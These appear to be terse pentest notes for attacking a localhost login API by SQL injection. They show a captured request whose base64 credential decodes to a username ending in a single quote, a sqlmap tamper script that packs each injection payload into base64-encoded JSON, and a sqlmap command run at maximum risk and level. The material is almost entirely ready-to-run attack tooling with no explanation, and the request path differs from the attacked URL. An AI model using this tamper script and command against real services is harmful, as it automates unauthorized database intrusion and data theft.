```
POST /Deviasiapi/login HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Origin: https://localhost
Connection: keep-alive
Referer: https://localhost/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Priority: u=0

credential=eyJ1c2VybmFtZSI6ImFkbWluJyIsInBhc3N3b3JkIjoiYWRtaW4ifQ%3D%3D
```
<br>

tamper_json.py<br>
```
#!/usr/bin/env python
import base64
import json

def tamper(payload, **kwargs):
    if payload:
        # Buat struktur JSON dengan payload di username
        data = {
            "username": f"ADMIN{payload}",
            "password": "ADIN"
        }
        # Ubah ke JSON lalu ke Base64
        json_str = json.dumps(data)
        return base64.b64encode(json_str.encode()).decode()
    return payload
```
<br>

cp /home/general/sqlmap/tamper_json.py /home/general/sqlmap/tamper/ <br>

python3 sqlmap.py -u https://localhost/api/login --data "credential=*" --method POST --tamper=tamper_json  --dbms mysql  --level=3 --risk=3 --batch  --headers "Origin: https://localhost\nReferer: https://localhost/" 
<br>












